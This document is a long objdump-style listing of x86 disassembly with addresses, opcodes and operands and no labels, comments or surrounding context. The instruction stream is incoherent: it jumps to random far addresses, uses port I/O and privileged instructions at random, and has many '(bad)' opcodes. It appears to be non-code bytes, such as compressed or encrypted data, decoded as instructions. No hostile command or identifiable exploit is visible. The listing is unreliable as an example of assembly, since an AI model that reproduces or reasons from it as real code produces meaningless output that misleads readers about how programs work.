  41206b:	xor    cl,ah
  41206d:	test   eax,0xa9b50a6d
  412072:	call   0xf20e:0x2e2f2d44
  412079:	fdivr  DWORD PTR [eax-0x4c4ee8cf]
  41207f:	xchg   ebp,eax
  412080:	in     eax,dx
  412081:	pop    edx
  412082:	adc    al,0x53
  412084:	xchg   ebx,eax
  412085:	fcomp  DWORD PTR [edx+0x643620cf]
  41208b:	lds    ecx,FWORD PTR [esi+0x1a]
  41208e:	mov    dl,0x97
  412090:	mov    WORD PTR [ebx+0x186e3b06],gs
  412096:	aas    
  412097:	popf   
  412098:	fsub   QWORD PTR [eax]
  41209a:	shr    DWORD PTR [ebx+0x179d6093],1
  4120a0:	ret    0x38b1
  4120a3:	cmp    edx,edi
  4120a5:	call   0x28b31053
  4120aa:	repnz sbb BYTE PTR [ebx+ecx*8-0x1497d094],ch
  4120b2:	sub    ch,BYTE PTR [esi]
  4120b4:	jns    0x4120bd
  4120b6:	es and eax,0xdfdb709d
  4120bc:	out    0x2e,al
  4120be:	pop    ss
  4120bf:	xor    BYTE PTR [ecx+0x79311a30],dh
  4120c5:	jmp    0x412073
  4120c7:	jb     0x41211d
  4120c9:	sub    ebp,ecx
  4120cb:	lds    ecx,FWORD PTR ss:[edx+0x2e]
  4120cf:	jno    0x41208a
  4120d1:	fadd   QWORD PTR [esi+0x16376a34]
  4120d7:	adc    BYTE PTR [esi-0x3b85e17c],cl
  4120dd:	stc    
  4120de:	imul   ecx,DWORD PTR [edi],0x24191fbb
  4120e4:	retf   
  4120e5:	mov    edi,0x5866949e
  4120ea:	pop    esp
  4120eb:	mov    bh,0xa7
  4120ed:	rcl    BYTE PTR [ebp-0x14fadf46],cl
  4120f3:	pop    eax
  4120f4:	xchg   esp,eax
  4120f5:	adc    eax,0x83a36795
  4120fa:	ret    
  4120fb:	js     0x412105
  4120fd:	lahf   
  4120fe:	loop   0x412124
  412100:	pop    edi
  412101:	ret    
  412102:	adc    ah,ah
  412104:	sub    BYTE PTR [ebx],bl
  412106:	jp     0x41208d
  412108:	dec    ecx
  412109:	push   ecx
  41210a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41210b:	loope  0x412103
  41210d:	push   esi
  41210e:	shl    DWORD PTR [ebp+0x45fcbf82],0x8c
  412115:	sub    esp,DWORD PTR [ebx+ecx*1]
  412118:	push   eax
  412119:	arpl   dx,bp
  41211b:	sbb    ecx,edx
  41211d:	or     eax,0x257a997a
  412122:	out    0xb0,al
  412124:	xor    BYTE PTR [ecx+0x3d01f264],bh
  41212a:	or     ebp,DWORD PTR [edi+0x6d]
  41212d:	(bad)  
  41212e:	sub    DWORD PTR [esi-0x2c],ebx
  412131:	push   0x48b0adc8
  412136:	test   eax,0x3f9fe48a
  41213b:	mov    ds,ebp
  41213d:	mov    ds,WORD PTR [ebx]
  41213f:	sbb    al,0xec
  412141:	lea    esp,[eax+0x62]
  412144:	out    dx,eax
  412145:	ret    0x3263
  412148:	std    
  412149:	dec    ebp
  41214a:	jle    0x412170
  41214c:	inc    esp
  41214d:	std    
  41214e:	rcr    DWORD PTR [edx+edx*4+0x1b143716],0x77
  412156:	or     edx,DWORD PTR [eax]
  412158:	cmp    dl,BYTE PTR [edi+0x49]
  41215b:	mov    edx,0x85fbb386
  412160:	cdq    
  412161:	loopne 0x4120e3
  412163:	rcr    DWORD PTR [esi+0x11f631fe],1
  412169:	addr16 sub eax,0x6a463a0d
  41216f:	jmp    0xea82431d
  412174:	dec    ecx
  412175:	or     al,0xb8
  412177:	int3   
  412178:	enter  0x24ba,0xb1
  41217c:	xchg   ecx,eax
  41217d:	fldenv [eax]
  41217f:	mov    edi,edi
  412181:	jmp    0xb40e:0x14c01f2a
  412188:	out    dx,al
  412189:	adc    al,BYTE PTR [ecx+ecx*2-0x5f]
  41218d:	xor    DWORD PTR [ecx],ebx
  41218f:	pop    ebp
  412190:	ret    
  412191:	and    eax,0x19a651bc
  412196:	cmp    edi,esp
  412198:	xchg   edx,eax
  412199:	mov    dl,BYTE PTR [eax]
  41219b:	sub    al,0x9b
  41219d:	loope  0x412191
  41219f:	xchg   BYTE PTR [ebp+0x58],ah
  4121a2:	cli    
  4121a3:	mov    esp,0x8b9e3cbe
  4121a8:	xchg   ebp,eax
  4121a9:	outs   dx,DWORD PTR ds:[esi]
  4121aa:	and    eax,0x9334349c
  4121af:	fldcw  WORD PTR [edx+0x4b]
  4121b2:	rcr    BYTE PTR [ebp+0x62],0x9a
  4121b6:	mov    ah,0x76
  4121b8:	and    BYTE PTR [ebx-0x15],cl
  4121bb:	or     eax,0x22f1c978
  4121c0:	and    DWORD PTR [edx],ebp
  4121c2:	cli    
  4121c3:	dec    esi
  4121c4:	mov    al,ds:0xf57e3aa0
  4121c9:	or     al,0xf6
  4121cb:	fidiv  WORD PTR [ebx-0x4]
  4121ce:	outs   dx,DWORD PTR ds:[esi]
  4121cf:	iret   
  4121d0:	and    ebp,edi
  4121d2:	(bad)  
  4121d3:	push   eax
  4121d4:	mov    fs,WORD PTR [ebx-0x4d]
  4121d7:	(bad)  
  4121d8:	pop    edx
  4121d9:	inc    esi
  4121da:	sbb    DWORD PTR [ecx-0x4322367],0xc601d355
  4121e4:	push   ebx
  4121e5:	mov    ch,0xb6
  4121e7:	adc    DWORD PTR [ecx*1-0x2df12da7],ebp
  4121ee:	call   0x33f9:0x1839d617
  4121f5:	dec    ebp
  4121f6:	xchg   esp,eax
  4121f7:	mov    eax,ds:0xa3eb2a69
  4121fc:	adc    BYTE PTR [edi-0x4ab2b40d],ch
  412202:	(bad)  
  412203:	repnz (bad) 
  412205:	call   0xf9ba5547
  41220a:	mov    ds:0x902422b1,al
  41220f:	div    dh
  412211:	and    ebp,DWORD PTR [esi]
  412213:	call   0x2d55:0xcdd11cf6
  41221a:	ret    
  41221b:	or     ecx,edx
  41221d:	dec    edi
  41221e:	cmc    
  41221f:	rcl    DWORD PTR [eax+0x5f53d478],cl
  412225:	push   eax
  412226:	push   es
  412227:	push   ds
  412228:	inc    edi
  412229:	add    ebp,edx
  41222b:	int3   
  41222c:	mov    dh,0x17
  41222e:	stc    
  41222f:	mov    al,0x29
  412231:	push   ss
  412232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412233:	add    al,0x9b
  412235:	push   cs
  412236:	cmc    
  412237:	push   0x6c
  412239:	xchg   ebp,eax
  41223a:	in     al,dx
  41223b:	inc    ecx
  41223c:	lock fcom DWORD PTR [ebx-0x6abc13a4]
  412243:	inc    edi
  412244:	cmp    bh,BYTE PTR [edx]
  412246:	call   0x6d9deb7e
  41224b:	js     0x4121d8
  41224d:	push   edi
  41224e:	fiadd  DWORD PTR [eax-0x2e]
  412251:	lods   eax,DWORD PTR ds:[esi]
  412252:	jg     0x412260
  412254:	scas   al,BYTE PTR es:[edi]
  412255:	cwde   
  412256:	mov    bh,0x0
  412258:	inc    esp
  412259:	sub    BYTE PTR [ebp+edx*1+0x1c5d62e5],0x3b
  412261:	sbb    DWORD PTR [esi+0x1d],edx
  412264:	pop    ebx
  412265:	imul   edx
  412267:	loopne 0x4121fa
  412269:	lahf   
  41226a:	cli    
  41226b:	and    esi,DWORD PTR [esi]
  41226d:	pop    esp
  41226f:	(bad)
  412272:	aam    0x23
  412274:	lea    esi,[ebx]
  412276:	aad    0xff
  412278:	in     al,0xf5
  41227a:	cmp    BYTE PTR [esi],0xec
  41227d:	inc    ecx
  41227e:	pop    ds
  41227f:	int3   
  412280:	jecxz  0x41222a
  412282:	sbb    eax,0x236cf47b
  412287:	push   0xdd11b02d
  41228c:	(bad)  
  41228d:	mov    ecx,0x180b162c
  412292:	cmp    eax,0x34466e03
  412297:	push   eax
  412298:	sbb    eax,0xd7c25231
  41229d:	jbe    0x412286
  41229f:	pop    esp
  4122a0:	ffree  st(4)
  4122a2:	dec    edx
  4122a3:	jns    0x412234
  4122a5:	(bad)  
  4122a7:	dec    esp
  4122a8:	xchg   ecx,eax
  4122a9:	lahf   
  4122aa:	pop    ss
  4122ab:	pop    ss
  4122ac:	into   
  4122ad:	fimul  DWORD PTR [ecx+0x4e]
  4122b0:	ja     0x412290
  4122b2:	repnz int 0xd8
  4122b5:	stos   BYTE PTR es:[edi],al
  4122b6:	out    0x7c,al
  4122b8:	clc    
  4122b9:	in     eax,dx
  4122ba:	xor    al,BYTE PTR [ebx+ebp*8]
  4122bd:	mov    ss,WORD PTR [esi+eax*4-0x10a728b0]
  4122c4:	sub    ebp,DWORD PTR [ecx-0x6c80007c]
  4122ca:	fbstp  TBYTE PTR [ecx]
  4122cc:	aam    0x30
  4122ce:	mov    ebx,0xd72091b4
  4122d3:	fld    DWORD PTR [edi*2-0xb7c54ab]
  4122da:	mov    bl,0xce
  4122dc:	retf   
  4122dd:	fst    QWORD PTR [edi-0x785497d]
  4122e3:	je     0x4122c3
  4122e5:	stos   BYTE PTR es:[edi],al
  4122e6:	cdq    
  4122e7:	in     eax,dx
  4122e8:	mov    bl,0xb3
  4122ea:	jmp    0x308fedca
  4122ef:	or     al,0x32
  4122f1:	and    ch,bh
  4122f3:	add    eax,0x4ec61e7d
  4122f8:	mov    ah,0x3d
  4122fa:	pop    edx
  4122fb:	cmc    
  4122fc:	xlat   BYTE PTR ds:[ebx]
  4122fd:	sar    DWORD PTR [edi-0x4d],0xbb
  412301:	stos   DWORD PTR es:[edi],eax
  412302:	iret   
  412303:	out    dx,eax
  412304:	jns    0x4122a0
  412306:	adc    bh,BYTE PTR [esi+edx*4+0x75]
  41230a:	inc    ecx
  41230b:	or     ebp,DWORD PTR [edx-0x60]
  41230e:	dec    ebp
  41230f:	pop    ecx
  412310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412311:	in     al,dx
  412312:	push   ebp
  412313:	fs int 0xe
  412316:	sub    BYTE PTR [ebx+0x6a],dh
  412319:	shl    esp,cl
  41231b:	call   0x3ddf:0x10a0a3cb
  412322:	inc    ebx
  412323:	sbb    BYTE PTR [ebx],bl
  412325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412326:	fdiv   DWORD PTR [edi-0x5d366f2e]
  41232c:	sar    BYTE PTR [ebx],cl
  41232e:	pop    edx
  41232f:	sub    ebx,ecx
  412331:	retf   0x3c0f
  412334:	cwde   
  412335:	addr16 into 
  412337:	or     dh,BYTE PTR ds:0x1434963d
  41233d:	(bad)  
  41233e:	cld    
  41233f:	jno    0x4123b4
  412341:	add    ebp,ebx
  412343:	xor    eax,0x59d0db3c
  412348:	retf   
  412349:	xor    eax,0x5082a2e4
  41234e:	fadd   DWORD PTR [ebx]
  412350:	pop    ss
  412351:	ret    0xf83f
  412354:	sub    DWORD PTR [edx+edx*8+0x70],ebx
  412358:	scas   al,BYTE PTR es:[edi]
  412359:	mov    bl,0x4c
  41235b:	sub    ch,BYTE PTR [ebp-0x2e]
  41235e:	cli    
  41235f:	call   DWORD PTR ds:0xb254f8b4
  412365:	leave  
  412366:	push   ss
  412367:	xchg   ebp,eax
  412368:	jl     0x412337
  41236a:	ss fild DWORD PTR cs:[ebp+0x6e]
  41236f:	(bad)
  412372:	lods   al,BYTE PTR ds:[esi]
  412373:	fild   DWORD PTR [ebp-0x6b32e578]
  412379:	pop    ecx
  41237a:	aaa    
  41237b:	and    eax,0x9ed8493e
  412380:	fimul  WORD PTR [esi]
  412382:	sbb    al,0x33
  412384:	shr    dl,0x1f
  412387:	push   0x1f37ef8
  41238c:	cli    
  41238d:	inc    esp
  41238e:	push   esi
  41238f:	dec    eax
  412390:	(bad)  
  412391:	outs   dx,DWORD PTR ds:[esi]
  412392:	cmp    DWORD PTR [esi+0xd28e],ecx
  412398:	push   0x14
  41239a:	pop    edx
  41239b:	mov    ds:0x7bc747ca,eax
  4123a0:	(bad)  
  4123a1:	pop    esp
  4123a2:	sbb    DWORD PTR [ecx+edx*8],0x8
  4123a6:	into   
  4123a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a8:	aam    0x98
  4123aa:	and    BYTE PTR [edi-0x69ced62b],ah
  4123b0:	fidivr WORD PTR [eax+0x34]
  4123b3:	push   cs
  4123b4:	jb     0x41240e
  4123b6:	jnp    0x4123e4
  4123b8:	adc    BYTE PTR [esi+0x285f50a],ch
  4123be:	inc    eax
  4123bf:	and    al,0x44
  4123c1:	pop    ecx
  4123c2:	sbb    esp,DWORD PTR [ecx+eiz*1+0x1a]
  4123c6:	mov    al,ds:0xbcc670c3
  4123cb:	icebp  
  4123cc:	jne    0x41236d
  4123ce:	ja     0x412389
  4123d0:	imul   edx,DWORD PTR [esi],0x55938955
  4123d6:	(bad)  
  4123d7:	xlat   BYTE PTR ds:[ebx]
  4123d8:	int    0x2a
  4123da:	aas    
  4123db:	lea    ebx,[edx-0x49]
  4123de:	cwde   
  4123df:	jl     0x41244f
  4123e1:	jmp    0xe8f6:0x538a8d87
  4123e8:	test   cl,ch
  4123ea:	jge    0x412409
  4123ec:	(bad)  
  4123ee:	push   ebp
  4123ef:	or     eax,0xe4845375
  4123f4:	lock mov ebx,0xb4123c36
  4123fa:	add    al,0x9c
  4123fc:	jnp    0x412444
  4123fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ff:	sub    ebx,ecx
  412401:	imul   edi,edi,0xaeebf66f
  412407:	push   sp
  412409:	pop    esp
  41240a:	jbe    0x4123b4
  41240c:	mov    WORD PTR [ebx],gs
  41240e:	add    BYTE PTR [ebp+ecx*8-0x7571426b],al
  412415:	and    dl,BYTE PTR [eax]
  412417:	scas   al,BYTE PTR es:[edi]
  412418:	mov    ebp,0xa72d2a95
  41241d:	mov    al,0x75
  41241f:	mov    ch,0xef
  412421:	xor    BYTE PTR [edx+0x5a],0x37
  412425:	shr    BYTE PTR [ebp+edx*2-0x4f],0x6d
  41242a:	fwait
  41242b:	xchg   esp,eax
  41242c:	cmc    
  41242d:	mov    edi,0x4bef7377
  412432:	stc    
  412433:	pop    ebx
  412434:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412436:	in     al,dx
  412437:	xchg   esi,eax
  412438:	cdq    
  412439:	call   0x7000ca9c
  41243e:	dec    esi
  41243f:	gs sub ah,cl
  412442:	(bad)  
  412443:	stos   BYTE PTR es:[edi],al
  412444:	sub    esi,DWORD PTR [edi+0x14]
  412447:	loope  0x412432
  412449:	je     0x41247e
  41244b:	push   ss
  41244c:	imul   esp,DWORD PTR [eax-0x653262cb],0x65
  412453:	repnz aaa 
  412455:	stos   DWORD PTR es:[edi],eax
  412456:	push   esp
  412457:	xchg   BYTE PTR [ebx-0x6a6d1a82],dl
  41245d:	mov    ds:0xbe5c9f2b,eax
  412462:	mov    al,ds:0xfb691285
  412467:	jmp    0x4124df
  412469:	xchg   BYTE PTR [ebx+0x44],dh
  41246c:	add    DWORD PTR [edi+ebp*8-0x5485b77],edi
  412473:	in     al,0xc1
  412475:	mov    edx,0xc507492f
  41247a:	jecxz  0x41245b
  41247c:	stc    
  41247d:	sub    eax,0xbc44319b
  412482:	xor    BYTE PTR [eax+0x5],bl
  412485:	mov    al,ds:0xa6a9242a
  41248a:	push   edx
  41248b:	and    BYTE PTR [esi-0x18],ah
  41248e:	pusha  
  41248f:	pop    eax
  412490:	dec    edi
  412491:	pop    edx
  412492:	mov    eax,0xbe172d1
  412497:	fstp   DWORD PTR [eax-0x430c0574]
  41249d:	mov    ecx,0xbec8bf2
  4124a2:	jae    0x845a6635
  4124a8:	sahf   
  4124a9:	retf   0x7a99
  4124ac:	ja     0x412523
  4124ae:	fisttp DWORD PTR ds:0x4aa2d9aa
  4124b4:	and    eax,0xe948c7c9
  4124b9:	ins    BYTE PTR es:[edi],dx
  4124ba:	ins    BYTE PTR es:[edi],dx
  4124bb:	jmp    0x3b22279e
  4124c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124c1:	addr16 xchg ebx,eax
  4124c3:	xor    esi,DWORD PTR [edx+ecx*4+0x6]
  4124c7:	outs   dx,DWORD PTR ds:[esi]
  4124c8:	jb     0x4124b1
  4124ca:	mov    ch,0xd0
  4124cc:	mov    ebx,0x5e888f5
  4124d1:	pop    esp
  4124d2:	push   0x6151141c
  4124d7:	scas   eax,DWORD PTR es:[edi]
  4124d8:	push   edi
  4124d9:	loopne 0x4124a0
  4124db:	popa   
  4124dc:	mov    ds:0x2e3b3a3c,al
  4124e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124e2:	loop   0x412517
  4124e4:	push   esp
  4124e5:	jmp    0x412502
  4124e7:	sub    DWORD PTR [ebp-0xe],edx
  4124ea:	shl    bh,1
  4124ec:	call   0x1820aa68
  4124f1:	ror    ah,cl
  4124f3:	pop    esi
  4124f4:	out    0x21,eax
  4124f6:	sbb    al,0xfc
  4124f8:	aad    0xe5
  4124fa:	jbe    0x41251f
  4124fc:	hlt    
  4124fd:	cmp    ebx,0x3086681a
  412503:	xchg   BYTE PTR [ebx+edi*2+0x52fcfe12],cl
  41250a:	std    
  41250b:	or     BYTE PTR [ecx+0x496d6663],cl
  412511:	xlat   BYTE PTR ds:[ebx]
  412512:	int3   
  412513:	cmp    esp,DWORD PTR [ebx+edi*8]
  412516:	inc    edi
  412517:	cdq    
  412518:	xlat   BYTE PTR ds:[ebx]
  412519:	add    DWORD PTR [ecx],edi
  41251b:	fisubr DWORD PTR [esi-0x4f]
  41251e:	pop    edi
  41251f:	sub    bl,BYTE PTR [ecx]
  412521:	jb     0x41256c
  412523:	adc    DWORD PTR [ecx],esp
  412525:	ja     0x41252b
  412527:	push   0x8c1e0501
  41252c:	ret    
  41252d:	sar    DWORD PTR [eax+ecx*8+0x36af8d75],0xda
  412535:	xchg   ebp,eax
  412536:	inc    ebx
  412537:	out    0xb7,eax
  412539:	out    dx,al
  41253a:	(bad)  
  41253b:	sbb    DWORD PTR [eax+0x5],edx
  41253e:	jbe    0x412527
  412540:	and    ebx,DWORD PTR [si+0x668a]
  412545:	mov    WORD PTR [ebp+0x26ce67d1],ds
  41254b:	xchg   ecx,eax
  41254c:	stos   DWORD PTR es:[edi],eax
  41254d:	outs   dx,DWORD PTR ds:[esi]
  41254e:	push   edi
  41254f:	and    al,0x5c
  412551:	mov    ch,0x7c
  412553:	out    0x5a,eax
  412555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412556:	and    DWORD PTR [ebx+esi*8-0xbdd26e9],0xfffffffd
  41255e:	and    dl,ah
  412560:	das    
  412561:	outs   dx,DWORD PTR ds:[esi]
  412562:	add    edi,DWORD PTR [edx-0x2e]
  412565:	out    0xe1,al
  412567:	sbb    eax,0xd05664ac
  41256c:	inc    ebx
  41256d:	or     ebp,DWORD PTR [ebx+0x3a]
  412570:	fisub  DWORD PTR [edx]
  412572:	dec    eax
  412573:	mov    eax,0xf61bbc6b
  412578:	push   si
  41257a:	enter  0x9566,0xb3
  41257e:	retf   0xa1c1
  412581:	(bad)  
  412582:	jbe    0x412505
  412584:	pop    ds
  412585:	xchg   ebx,eax
  412586:	enter  0x3125,0x4f
  41258a:	mov    es,WORD PTR [eax]
  41258c:	and    eax,0xc0543845
  412591:	or     eax,0x45af7763
  412596:	sbb    ah,al
  412598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412599:	popa   
  41259a:	add    DWORD PTR [ecx-0x39deaa27],esp
  4125a0:	mov    eax,es
  4125a2:	push   cs
  4125a3:	out    dx,ax
  4125a5:	jne    0x412566
  4125a7:	aam    0x59
  4125a9:	lock inc DWORD PTR [ecx+0x79a4ef3b]
  4125b0:	fsubr  DWORD PTR [esi+0x4b73721]
  4125b6:	add    BYTE PTR [esi-0x181034e4],dh
  4125bc:	jb     0x4125ac
  4125be:	sti    
  4125bf:	sub    cl,BYTE PTR [edx+edx*8+0x75b6faa2]
  4125c6:	mov    esi,DWORD PTR [edi-0x2f2f8169]
  4125cc:	daa    
  4125cd:	jge    0x412603
  4125cf:	cmp    eax,0xb5b6a2a2
  4125d4:	xchg   edi,eax
  4125d5:	sbb    eax,DWORD PTR [ebx+esi*2-0x1a]
  4125d9:	repz dec esp
  4125db:	mov    bl,cl
  4125dd:	(bad)  
  4125de:	in     al,dx
  4125df:	shr    dl,cl
  4125e1:	push   edx
  4125e2:	shl    BYTE PTR [eax+0x2e],1
  4125e5:	mov    al,0xa5
  4125e7:	jecxz  0x4125cc
  4125e9:	popf   
  4125ea:	iret   
  4125eb:	cmp    BYTE PTR [eax-0x39],dl
  4125ee:	jle    0x412658
  4125f0:	inc    esp
  4125f1:	fstp   TBYTE PTR [edi-0x7f]
  4125f4:	lds    esi,FWORD PTR [ebp+edi*4+0x771ef98c]
  4125fb:	(bad)  [ecx]
  4125fd:	ja     0x412584
  4125ff:	nop
  412600:	mov    bl,0xe8
  412602:	cmp    BYTE PTR [ecx],dh
  412604:	or     eax,0x5ca7189d
  412609:	xchg   ebx,eax
  41260a:	mul    BYTE PTR [esi-0x30ca95d9]
  412610:	sub    ch,BYTE PTR [edx]
  412612:	cmp    BYTE PTR [esi-0x4b],cl
  412615:	cwde   
  412616:	dec    edx
  412617:	aaa    
  412618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412619:	dec    edx
  41261a:	call   0x509bf23
  41261f:	cmp    cl,ah
  412621:	inc    ebp
  412622:	ins    DWORD PTR es:[edi],dx
  412623:	add    dh,bl
  412625:	push   eax
  412626:	push   eax
  412627:	add    dl,dh
  412629:	fwait
  41262a:	leave  
  41262b:	sti    
  41262c:	xchg   esp,eax
  41262d:	lea    eax,[ecx]
  41262f:	daa    
  412630:	cmp    BYTE PTR [eax],cl
  412632:	int3   
  412633:	add    esp,DWORD PTR [eax-0x23c0e241]
  412639:	push   0x60989cfe
  41263e:	push   ss
  41263f:	hlt    
  412640:	or     BYTE PTR [edi+0x2b],al
  412643:	div    al
  412645:	lds    ebx,FWORD PTR [ecx]
  412647:	ret    0x7764
  41264a:	xor    DWORD PTR [edi],eax
  41264c:	sub    eax,0x5861db91
  412651:	push   esi
  412652:	outs   dx,DWORD PTR ds:[esi]
  412653:	lock adc edx,esi
  412656:	(bad)  
  412657:	dec    esp
  412658:	(bad)  
  412659:	mov    edi,0x3921fda3
  41265e:	ror    DWORD PTR [ecx+0x0],0xfd
  412662:	jp     0x4125f4
  412664:	icebp  
  412665:	pop    edx
  412666:	outs   dx,DWORD PTR ds:[esi]
  412667:	ins    DWORD PTR es:[edi],dx
  412668:	aam    0xc
  41266a:	jp     0x41261f
  41266c:	adc    al,0xe8
  41266e:	xor    cl,BYTE PTR [ebx]
  412670:	inc    ebx
  412671:	dec    eax
  412672:	in     eax,0x7d
  412674:	mov    DWORD PTR [ebp-0x34],ebp
  412677:	jne    0x412633
  412679:	cwde   
  41267a:	push   cs
  41267b:	jno    0x412641
  41267d:	mov    dh,0x4b
  41267f:	fdiv   DWORD PTR [edi]
  412681:	mov    ch,0xf8
  412683:	push   ecx
  412684:	inc    eax
  412685:	dec    eax
  412686:	jno    0x412644
  412688:	out    dx,eax
  412689:	loop   0x412648
  41268b:	xchg   esi,eax
  41268c:	imul   ecx,DWORD PTR [ecx+eax*1],0xfffffff5
  412690:	stos   BYTE PTR es:[edi],al
  412691:	and    DWORD PTR [ecx],ecx
  412693:	cmp    ebx,DWORD PTR [edx]
  412695:	(bad)  
  412696:	pop    es
  412697:	mov    eax,0x95b9e829
  41269c:	mov    fs,WORD PTR [esi-0x67]
  41269f:	dec    ebp
  4126a0:	in     eax,0x2a
  4126a2:	test   DWORD PTR [esi+edx*4-0x4a],esi
  4126a6:	test   DWORD PTR [eax-0x28],0x390a39ef
  4126ad:	jmp    0x4126d0
  4126af:	popf   
  4126b0:	in     eax,dx
  4126b1:	sbb    al,0xdc
  4126b3:	and    edi,ecx
  4126b5:	sar    ecx,1
  4126b7:	add    bh,dh
  4126b9:	popa   
  4126ba:	mul    BYTE PTR [edx-0x6ef660ab]
  4126c0:	mov    esi,0x291beff8
  4126c5:	lahf   
  4126c6:	xchg   edx,edx
  4126c8:	(bad)  
  4126ca:	push   ss
  4126cb:	fwait
  4126cc:	mov    ebp,0xf27ec8f2
  4126d1:	mov    ch,ch
  4126d3:	scas   al,BYTE PTR es:[di]
  4126d5:	loopne 0x412715
  4126d7:	mov    esp,0x706ac9e2
  4126dc:	icebp  
  4126dd:	dec    esi
  4126de:	jp     0x412662
  4126e0:	add    eax,0x822a3d01
  4126e5:	scas   al,BYTE PTR es:[edi]
  4126e6:	icebp  
  4126e7:	xchg   ebx,eax
  4126e8:	adc    eax,0xbb75f5bf
  4126ed:	cmp    eax,0xf66eac0e
  4126f2:	loopne 0x41276a
  4126f4:	ret    0x19d9
  4126f7:	mov    WORD PTR [edx+0x59592b5],es
  4126fd:	or     eax,DWORD PTR [ebx+0x34300c2f]
  412703:	outs   dx,BYTE PTR ds:[esi]
  412704:	push   ebx
  412705:	fbstp  TBYTE PTR [edx+0x51]
  412708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412709:	or     edi,edx
  41270b:	faddp  st(7),st
  41270d:	or     ah,BYTE PTR [edi+0x5e]
  412710:	lds    ecx,FWORD PTR [edx-0x1]
  412713:	loope  0x41276f
  412715:	les    edx,FWORD PTR [edi+0x27]
  412718:	retf   
  412719:	xchg   ebx,eax
  41271a:	dec    edi
  41271b:	mov    bh,0xc7
  41271d:	mov    dl,0xeb
  41271f:	data16 int 0x88
  412722:	call   0x71e6:0x841e2be
  412729:	popf   
  41272a:	sbb    BYTE PTR [eax-0x5c35fb51],dl
  412730:	cld    
  412731:	ins    DWORD PTR es:[edi],dx
  412732:	or     esi,esp
  412734:	(bad)  
  412735:	nop
  412736:	cmp    ebp,DWORD PTR [edx-0x72]
  412739:	les    ecx,FWORD PTR [esi]
  41273b:	mov    esi,0xd627988f
  412740:	mov    edx,0xe6efc24
  412745:	mov    cl,0x4b
  412747:	pop    ds
  412748:	xchg   edi,eax
  412749:	retf   0xc02
  41274c:	test   DWORD PTR [eax+0xc],ebx
  41274f:	aaa    
  412750:	xchg   edi,eax
  412751:	mov    dl,0xc5
  412753:	sbb    eax,0x75a8f7d7
  412758:	fwait
  412759:	imul   ebp,DWORD PTR [eax],0x3d8046b8
  41275f:	in     eax,0xd7
  412761:	ret    
  412762:	cmp    BYTE PTR [eax],bh
  412764:	fucom  st(0)
  412766:	inc    ch
  412768:	xchg   DWORD PTR [ebp+0xc789c4f],ebp
  41276e:	fwait
  41276f:	lahf   
  412770:	lods   al,BYTE PTR ds:[esi]
  412771:	cmp    eax,0xc4d1ec3e
  412776:	mov    ds:0xe6d52365,al
  41277b:	std    
  41277c:	aaa    
  41277d:	adc    DWORD PTR [edi-0x5],0x77e5657e
  412784:	add    esi,DWORD PTR [ebp+0x1e753331]
  41278a:	mov    ch,0x29
  41278c:	add    al,BYTE PTR [eax+0x6dbf759a]
  412792:	fst    QWORD PTR [eax-0x57ef8f47]
  412798:	sub    eax,0x7c77541
  41279d:	in     al,0x46
  41279f:	add    bh,ah
  4127a1:	or     al,0xac
  4127a3:	aad    0x38
  4127a5:	inc    esp
  4127a7:	mov    cl,0x5f
  4127a9:	lods   al,BYTE PTR ds:[esi]
  4127aa:	cli    
  4127ab:	mov    ah,ch
  4127ad:	iret   
  4127ae:	repnz or eax,0xb8862684
  4127b4:	popa   
  4127b5:	add    dl,BYTE PTR [edi+0x755165e6]
  4127bb:	add    eax,0xa2111e22
  4127c0:	ds aad 0xdb
  4127c3:	ins    BYTE PTR es:[edi],dx
  4127c4:	icebp  
  4127c5:	rol    ebp,0x1c
  4127c8:	and    bh,bl
  4127ca:	in     eax,0x6b
  4127cc:	(bad)  
  4127ce:	pushf  
  4127cf:	das    
  4127d0:	xor    ah,ch
  4127d2:	cld    
  4127d3:	icebp  
  4127d4:	xchg   BYTE PTR [ebp-0x5491379e],dh
  4127da:	repz jne 0x412769
  4127dd:	inc    eax
  4127de:	scas   eax,DWORD PTR es:[edi]
  4127df:	das    
  4127e0:	cli    
  4127e1:	inc    edi
  4127e2:	pop    edx
  4127e3:	push   ecx
  4127e4:	xchg   ebp,eax
  4127e5:	pop    ds
  4127e6:	in     al,0xb7
  4127e8:	pop    ds
  4127e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127ea:	mov    dh,0x77
  4127ec:	jne    0x412771
  4127ee:	fsubr  DWORD PTR [esi+eax*4-0x40]
  4127f2:	dec    ebp
  4127f3:	adc    al,0xee
  4127f5:	mov    dh,0x47
  4127f7:	adc    ch,BYTE PTR [edx+0x3cb924a8]
  4127fd:	shl    DWORD PTR [edx+0x6aa8c492],0xd5
  412804:	push   eax
  412805:	mov    dh,0xe3
  412807:	inc    eax
  412808:	cli    
  412809:	pop    ebp
  41280a:	push   edi
  41280b:	arpl   WORD PTR [edi-0x4e],bp
  41280e:	xlat   BYTE PTR ds:[ebx]
  41280f:	mov    cl,0x53
  412811:	mov    ds:0x1d499267,eax
  412816:	pop    ebp
  412817:	out    0x86,eax
  412819:	gs jmp 0x5a92:0xeafa851a
  412821:	jmp    DWORD PTR [ecx]
  412823:	cmp    ch,ah
  412825:	push   esi
  412826:	xchg   ebx,eax
  412827:	mov    ecx,0xf0f34c56
  41282c:	shr    dh,cl
  41282e:	dec    ecx
  41282f:	or     BYTE PTR [esp+ebx*1+0x5238a904],cl
  412836:	loop   0x412881
  412838:	xchg   BYTE PTR [esi+0x26223965],al
  41283e:	adc    al,0x48
  412840:	std    
  412841:	dec    edx
  412842:	retf   0x6953
  412845:	fmul   DWORD PTR [edx-0xb]
  412848:	fist   WORD PTR [edx]
  41284a:	fwait
  41284b:	call   0x312a:0x1cab6d3d
  412852:	fst    DWORD PTR fs:[ebx+ebp*2-0x24]
  412857:	cwde   
